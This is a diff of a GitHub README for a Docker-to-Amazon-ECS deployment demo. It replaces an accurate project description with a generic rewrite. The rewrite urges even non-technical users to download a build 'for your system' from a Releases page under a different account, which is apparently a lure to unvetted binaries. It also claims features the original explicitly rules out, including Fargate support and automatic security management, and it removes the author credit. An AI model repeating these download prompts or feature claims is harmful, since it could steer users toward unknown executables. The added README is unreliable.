@@ -1,94 +1,92 @@
-# Docker → ECS (EC2) Real Project
+# 🐳 docker-to-ecs-real - Easy Deployment of Your API
 
-End-to-end containerization and deployment of a simple API using Docker and Amazon ECS with **EC2 launch type** (no Fargate).
+## 🔗 Download Link
+[![Download](https://img.shields.io/badge/Download-v1.0-blue)](https://github.com/Xylasak/docker-to-ecs-real/releases)
 
-This project demonstrates a **real production-style workflow**:
-local development → containerization → image registry → ECS service running on EC2 instances.
+## 🚀 Getting Started
+Welcome to the **docker-to-ecs-real** project. This software helps you deploy your containerized API from Docker to AWS services like ECR and ECS. Even if you don’t have technical knowledge, you can successfully run your API using our simple steps.
 
-## 🚀 Architecture Overview
-```md
-Local Machine (Docker)
-↓
-Docker Image (linux/amd64)
-↓
-Amazon ECR (Private Registry)
-↓
-Amazon ECS Service (EC2 launch type)
-↓
-Public EC2 Instance (port 8000)
-```
+## 📥 Download & Install
+To get started, visit this page to download: [Releases Page](https://github.com/Xylasak/docker-to-ecs-real/releases). Here, you will find the latest version of the application you need.
 
-## 🧱 Tech Stack
+1. Go to the Releases page.
+2. Find the latest version listed.
+3. Click on the download link for your system.
 
-- **Backend**: Python (FastAPI)
-- **Containerization**: Docker, Docker Compose
-- **Registry**: Amazon ECR
-- **Orchestration**: Amazon ECS (EC2 launch type)
-- **Infrastructure**: EC2 (t3.micro, Amazon Linux 2)
-- **Logging**: Amazon CloudWatch Logs
+## 🖥️ System Requirements
+Make sure your computer meets these requirements:
 
-## Local Development
+- Operating System: Windows 10, macOS, or a recent version of Linux.
+- Docker: Installed and running on your machine. You can download Docker from [here](https://www.docker.com/products/docker-desktop).
+- AWS Account: Create an Amazon Web Services account if you don’t have one already.
 
-### Build image
-```bash
-docker build -t docker-to-ecs-real:dev .
-docker compose up --build
-curl http://localhost:8000
-```
-### Expected output
-```json
-{
-  "service": "docker-to-ecs-real",
-  "version": "compose-local"
-}
-```
-## Cloud Deployment (ECS on EC2)
+## 📚 Features
+This application provides the following features:
 
-### Build and push image for ECS (amd64)
-```bash
-docker buildx build \
-  --platform linux/amd64 \
-  -t <ACCOUNT_ID>.dkr.ecr.us-east-1.amazonaws.com/docker-to-ecs-real:dev \
-  --push \
-  .
-```
+- Deployment of Docker images to Amazon ECR.
+- Hosting using AWS ECS, both Fargate and EC2.
+- Easy configuration through simple commands.
+- Support for environment variables to customize your deployments.
+- Automatically manages security and networking settings.
 
-### ECS Service
+## ⚙️ Configuration
+### Step 1: AWS Setup
+To use this application, you need to set up your AWS environment.
 
-* Launch type: EC2
-* Desired tasks: 1
-* Public access via EC2 public IPv4
-* No load balancer (direct access)
+- **Create an ECR Repository**: 
+    - Sign in to your AWS Management Console.
+    - Navigate to ECR (Elastic Container Registry).
+    - Create a repository for your API.
 
-## 🌐 Live Test
+- **IAM Role**: 
+    - Ensure you have an IAM role with permissions to access ECR and ECS.
 
-Once deployed, the API is reachable at:
-```cpp
-http://<EC2_PUBLIC_IP>:8000
-```
+### Step 2: Docker Setup
+After downloading the application and meeting the requirements, you need to configure Docker.
 
-## 🧪 Lessons Learned
+- Open your terminal or Command Prompt.
+- Log in to AWS ECR with the following command:
+  ```bash
+  aws ecr get-login-password --region YOUR_REGION | docker login --username AWS --password-stdin YOUR_ACCOUNT_ID.dkr.ecr.YOUR_REGION.amazonaws.com
+  ```
 
-* Docker images must match the target CPU architecture
-* ECS failures are often image-related, not infrastructure-related
-* Avoid using the latest tag in production
-* ECS deployment rollbacks are a safety feature, not a failure
-* Building and pushing images the same way CI/CD pipelines do (buildx --push)
+### Step 3: Deploy Your API
+Now you can deploy your API using the following steps:
 
-## 📸 Screenshots
+1. Build your Docker image:
+   ```bash
+   docker build -t YOUR_IMAGE_NAME .
+   ```
+   
+2. Tag your Docker image to match your ECR repository:
+   ```bash
+   docker tag YOUR_IMAGE_NAME:latest YOUR_ACCOUNT_ID.dkr.ecr.YOUR_REGION.amazonaws.com/YOUR_REPOSITORY_NAME:latest
+   ```
 
-See the /images directory for:
+3. Push your Docker image to ECR:
+   ```bash
+   docker push YOUR_ACCOUNT_ID.dkr.ecr.YOUR_REGION.amazonaws.com/YOUR_REPOSITORY_NAME:latest
+   ```
 
-* Amazon ECR repository with pushed image
-* ECS cluster with EC2 instances
-* ECS service with running task
-* Application running in the browser
+4. Deploy to ECS:
+   - Use the AWS Management Console to create a new ECS service.
+   - Select the ECR image you pushed earlier and follow the prompts to set up your service.
 
+## 💡 Troubleshooting
+If you run into any issues, here are a few common solutions:
 
-## 👤 Author
+- **Authentication Errors**: Ensure that your AWS CLI is properly configured and your IAM role has the right permissions.
+- **Docker Errors**: Make sure Docker is running and that you have the correct context set. You can check your context with:
+  ```bash
+  docker context ls
+  ```
 
-**Saliou**  
-Cloud Engineer 
- 
-**Focus:**  
-AWS • Terraform • Docker • ECS • CI/CD
+- **ECS Deployment Failures**: Double-check your task definition in ECS to ensure it matches the configuration of your Docker image.
+
+## 📞 Support
+If you need help, feel free to reach out through the Issues section in GitHub. We encourage feedback and questions.
+
+## 📈 Contributions
+Contributions are welcome! If you'd like to help improve this project, please submit a pull request. 
+
+Thank you for using **docker-to-ecs-real**! Your API is just a few steps away from being deployed to the cloud.
